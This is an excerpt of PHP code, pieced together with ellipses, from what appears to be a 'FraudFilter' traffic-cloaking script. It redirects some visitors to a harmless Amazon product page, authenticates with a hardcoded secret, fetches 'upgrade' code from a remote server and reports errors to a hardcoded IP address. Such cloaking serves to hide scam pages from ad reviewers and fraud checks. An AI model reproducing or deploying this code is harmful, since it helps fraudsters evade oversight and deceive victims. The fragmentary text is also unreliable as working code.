...
class FraudFilterDetector_ktlm3 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'fd773b6a-b305-42fb-bd97-5be2f48361b2.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.amazon.com/gp/product/B009OBA2V8/ref=s9_acsd_simh_hd_bw_bFfHr_c_x_3_w?pf_rd_m=ATVPDKIKX0DER&pf_rd_s=merchandised-search-4&pf_rd_r=SGYGN6G9Z48HGVSD16MB&pf_rd_t=101&pf_rd_p=797c249d-c7e8-5998-9602-e0ce831c7bc7&pf_rd_i=3733631');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: fd773b6a-b305-42fb-bd97-5be2f48361b2',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: fd773b6a-b305-42fb-bd97-5be2f48361b2';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: fd773b6a-b305-42fb-bd97-5be2f48361b2';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ktlm3&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ktlm3 = new FraudFilterDetector_ktlm3();
$fraudFilterDetector_ktlm3->check();
